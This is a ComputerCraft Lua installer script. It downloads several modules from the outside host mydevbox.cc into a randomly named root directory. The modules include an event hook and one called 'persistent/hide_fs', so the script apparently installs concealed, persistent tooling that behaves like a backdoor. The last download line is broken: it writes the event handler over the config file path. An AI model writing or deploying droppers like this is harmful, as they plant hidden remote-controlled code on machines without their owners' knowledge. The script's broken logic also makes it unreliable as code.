local function generateRandomString(length)
    local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local result = {}
    for i = 1, length do
        local rand = math.random(1, #charset)
        table.insert(result, charset:sub(rand, rand))
    end
    return table.concat(result)
end

local function downloadFile(url, path)
    local response = http.get(url, {["User-Agent"] = "ComputerCraft-BDA-Client"})
    if response then
        local file = fs.open(path, "w")
        file.write(response.readAll())
        file.close()
        response.close()
        print("File downloaded successfully to " .. path)
    else
        print("Failed to download file from " .. url)
    end
end

local DIR_4Nin92xCdd0 = "/" .. generateRandomString(8)

downloadFile("https://mydevbox.cc/src/networking/http/http.lua", DIR_4Nin92xCdd0.."/networking/http/http.lua")
downloadFile("https://mydevbox.cc/src/hooks/eventhook.lua", DIR_4Nin92xCdd0.."/hooks/eventhook.lua")
downloadFile("https://mydevbox.cc/src/modules/persistent/hide_fs.lua", DIR_4Nin92xCdd0.."/modules/persistent/hide_fs.lua")
downloadFile("https://mydevbox.cc/src/config/config.lua", DIR_4Nin92xCdd0.."/config/config.lua")
downloadFile("https://mydevbox.cc/src/eventhandler/eventhandler.lua", DIR_4Nin92xCdd0.."/config/config.lua")

